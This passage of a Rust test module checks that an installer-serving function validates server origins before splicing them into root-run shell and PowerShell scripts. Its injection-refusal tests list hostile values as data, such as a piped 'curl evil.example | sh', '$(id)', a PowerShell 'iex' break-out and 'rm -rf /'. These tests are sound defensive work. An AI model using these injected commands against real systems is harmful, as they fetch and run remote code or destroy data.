        // start with "eyJ" — the {"typ"/{"alg" header).
        assert!(!INSTALL_SH.contains("eyJ"));
        assert!(!INSTALL_PS1.contains("eyJ"));
    }

    // ─── FR-50: the served script names the server that served it ──────────

    /// The lock that makes the substitution non-silent. Without it, editing
    /// either script's `SERVER=` line disables the rewrite and nothing fails —
    /// self-hosted installs quietly go back to enrolling against roomler.ai.
    #[test]
    fn the_server_default_is_substitutable_exactly_once() {
        assert_eq!(
            INSTALL_SH.matches(SERVER_NEEDLE_SH).count(),
            1,
            "install.sh must contain exactly one `{SERVER_NEEDLE_SH}` — if you \
             edited that line, update SERVER_NEEDLE_SH in the same commit"
        );
        assert_eq!(
            INSTALL_PS1.matches(SERVER_NEEDLE_PS1).count(),
            1,
            "install.ps1 must contain exactly one `{SERVER_NEEDLE_PS1}` — if you \
             edited that line, update SERVER_NEEDLE_PS1 in the same commit"
        );
    }

    #[test]
    fn substitutable_origin_accepts_a_plain_scheme_host_port() {
        for (input, want) in [
            ("https://roomler.ai", "https://roomler.ai"),
            ("https://roomler.ai/", "https://roomler.ai"),
            ("http://localhost:8080", "http://localhost:8080"),
            ("http://localhost:8080/", "http://localhost:8080"),
            (
                "https://my-roomler.example.com:8443",
                "https://my-roomler.example.com:8443",
            ),
            ("  https://roomler.ai  ", "https://roomler.ai"),
        ] {
            assert_eq!(
                substitutable_origin(input).as_deref(),
                Some(want),
                "{input} should substitute as {want}"
            );
        }
    }

    /// The security half. This value is spliced into a script that runs as
    /// root/SYSTEM, so anything that is not plainly a scheme://host[:port] is
    /// REFUSED rather than escaped — a refusal serves the compiled-in default,
    /// which is exactly the behaviour before this existed.
    #[test]
    fn substitutable_origin_refuses_anything_that_could_be_injected() {
        for input in [
            // shell metacharacters, straight into a double-quoted string
            "https://roomler.ai\"; curl evil.example | sh; #",
            "https://roomler.ai$(id)",
            "https://roomler.ai`id`",
            "https://roomler.ai${IFS}",
            // PowerShell single-quote break-out
            "https://roomler.ai'; iex 'x",
            // newline — would append whole statements to the script
            "https://roomler.ai\nrm -rf /",
            // a path: the installer appends its own, so this is wrong even
            // when it is harmless
            "https://roomler.ai/base",
            "https://roomler.ai/api/",
            // userinfo, query, fragment
            "https://user:pw@roomler.ai",
            "https://roomler.ai?x=1",
            "https://roomler.ai#f",
            // wrong or missing scheme
            "ftp://roomler.ai",
            "roomler.ai",
            "//roomler.ai",
            "",
            "   ",
            "https://",
            "https:///",
            // malformed port
            "https://roomler.ai:",
            "https://roomler.ai:80a",
            "https://roomler.ai:123456",
        ] {
            assert_eq!(
                substitutable_origin(input),
                None,
                "{input:?} must be refused, not substituted"
            );
        }
    }

    #[test]
    fn a_self_hosted_origin_is_substituted_into_both_scripts() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "http://localhost:8080",
        );
        assert!(sh.contains("SERVER=\"http://localhost:8080\""));
        assert!(
            !sh.contains(SERVER_NEEDLE_SH),
            "the roomler.ai default must be gone, not merely joined"
        );

        let ps1 = with_server_default(
            INSTALL_PS1,
            SERVER_NEEDLE_PS1,
            |o| format!("[string]$Server = '{o}',"),
            "http://localhost:8080",
        );
        assert!(ps1.contains("[string]$Server = 'http://localhost:8080',"));
        assert!(!ps1.contains(SERVER_NEEDLE_PS1));
    }

    /// The hosted service's own case, and the reason this ships without a
    /// staged rollout: prod's `frontend_url` IS `https://roomler.ai`, so the
    /// bytes it serves do not change at all.
    #[test]
    fn the_hosted_origin_serves_the_script_byte_identical() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "https://roomler.ai",
        );
        assert_eq!(sh.as_ref(), INSTALL_SH);
        assert!(matches!(sh, Cow::Borrowed(_)), "identical ⇒ no allocation");
    }

    /// A refused origin must leave the script alone rather than, say, blank
    /// the default — a broken installer is worse than one pointing at the
    /// wrong server, because the operator has nothing to override.
    #[test]
    fn a_refused_origin_serves_the_compiled_in_default() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "https://roomler.ai\"; rm -rf /; #",
        );
        assert_eq!(sh.as_ref(), INSTALL_SH);
        assert!(sh.contains(SERVER_NEEDLE_SH));
    }

    #[test]
    fn content_type_for_known_extensions() {
        assert_eq!(content_type_for("foo.zip"), "application/zip");
        assert_eq!(content_type_for("foo.tar.gz"), "application/gzip");
        assert_eq!(content_type_for("foo.tgz"), "application/gzip");
        assert_eq!(
            content_type_for("foo.exe"),
            "application/vnd.microsoft.portable-executable"
        );
        assert_eq!(content_type_for("foo.bin"), "application/octet-stream");
    }
}
